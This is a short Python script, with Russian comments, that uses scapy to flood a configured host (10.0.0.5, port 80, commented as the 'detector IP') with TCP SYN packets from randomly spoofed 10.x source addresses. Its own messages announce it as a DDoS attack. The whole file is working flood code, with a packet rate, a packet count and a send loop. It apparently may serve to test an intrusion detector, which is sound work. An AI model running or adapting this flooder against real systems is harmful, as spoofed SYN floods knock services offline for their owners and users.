import random
import time

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

TARGET_IP = "10.0.0.5"  # IP детектора
TARGET_PORT = 80  # Целевой порт (22, 443 и т.д.)
PACKETS_PER_SECOND = 100  # Частота отправки пакетов
TOTAL_PACKETS = 1000  # Количество пакетов


def generate_10_network_ip():
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def attack_ddos_only(target_ip, target_port):
    print(f"🚀 Запуск DDoS-атаки на {target_ip}:{target_port}")
    count = 0
    try:
        while True:
            spoofed_ip = generate_10_network_ip()
            sport = random.randint(1024, 65535)
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")

            send(packet, verbose=False)
            count += 1

            # Периодически выводить статистику
            if count % 100 == 0:
                print(f"📦 Отправлено {count} пакетов")


            if TOTAL_PACKETS and count >= TOTAL_PACKETS:
                break

            time.sleep(1.0 / PACKETS_PER_SECOND)

    except KeyboardInterrupt:
        print("\n🛑 Атака остановлена пользователем")


if __name__ == "__main__":
    attack_ddos_only(TARGET_IP, TARGET_PORT)
